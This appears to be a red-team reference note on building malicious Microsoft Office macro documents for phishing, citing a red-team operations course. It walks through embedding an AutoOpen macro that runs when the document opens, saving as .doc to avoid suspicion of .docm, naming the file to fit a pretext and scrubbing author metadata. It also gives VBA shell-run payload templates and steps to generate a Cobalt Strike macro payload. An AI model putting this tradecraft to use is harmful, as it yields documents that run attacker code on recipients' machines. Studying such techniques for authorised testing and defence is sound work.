# Microsoft Office Macro Generation

> Visual Basic for Applications (VBA) is an implementation of Visual Basic that is widely used with Microsoft Office applications to enhance or augment data processing functionality.

---

## Create a Macro in a Word Document

1. In Word, navigate to **View** -> **Macros** -> **View Macros**
2. Change the **Macros in** field from **All active templates and documents** to the name of the current document
3. Give the Macro a name and click **Create**
	- To force a Macro to execute whenever the document is opened, name it **AutoOpen**
4. Develop the Macro
5. Test the Macro with the play, pause, and stop buttons
6. Save the document
	- Give it a name relevant to the chosen pretext
	- In the **Save as type** dropdown, change the format from `.docx` to **Word 97-2003 `(.doc)`**
		- You can't save Macros inside a `.docx` file
		- There's a stigma around the macro-enabled `.docm` extension
7. Prepare the document for delivery by scrubbing your username from it
	- Navigate to **File** -> **Info** -> **Inspect Document** -> **Check for Issues** -> **Inspect Document**
	- Click **Inspect**, then **Remove All** next to **Document Properties and Personal Information**
8. Save the document

---

## `calc.exe` VBA Macro Payload

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

---

## Architecture-Dependent Execution VBA Payload

```vba
Sub Pwn()
  Dim shell As Object
  Set shell = CreateObject("wscript.Shell")

  If shell.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%") = "AMD64" Then
    shell.run "$COMMAND_IF_64_BIT"
  Else
    shell.run "$COMMAND_IF_32_BIT"
  End If

End Sub
```

---

## Generate a Microsoft Office Macro Payload via Cobalt Strike

While connected to a Teamserver:

1. Navigate to `Attacks` -> `Packages` -> `MS Office Macro`
2. Select the appropriate Listener
3. Copy the macro
4. [[office-macro-generation#Create a Macro in a Word Document|Embed the macro in the desired document]]

---

## References

[ZeroPoint Security's CRTO Course](https://training.zeropointsecurity.co.uk/courses/take/red-team-ops/texts/30314758-visual-basic-for-applications-vba-macro-s)
